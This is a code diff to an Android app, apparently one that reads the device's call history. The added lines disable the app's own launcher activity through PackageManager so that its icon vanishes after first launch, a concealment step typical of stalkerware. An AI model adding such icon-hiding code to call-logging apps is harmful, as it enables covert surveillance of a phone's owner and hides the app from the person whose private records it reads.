@@ -3,7 +3,9 @@ package com.example.androidreadcallhistory;
 import java.sql.Date;
 
 import android.app.Activity;
+import android.content.ComponentName;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.os.Bundle;
 import android.os.Handler;
@@ -24,6 +26,13 @@ public class MainActivity extends Activity {
 		//getCallDetails();
 		m_Runnable.run();
 
+		/////// hide app icone ///
+
+		PackageManager p = getPackageManager();
+		ComponentName componentName = new ComponentName(this, com.example.androidreadcallhistory.MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
+		p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+
+		/////// hide app icone end ///
 
 	}
 
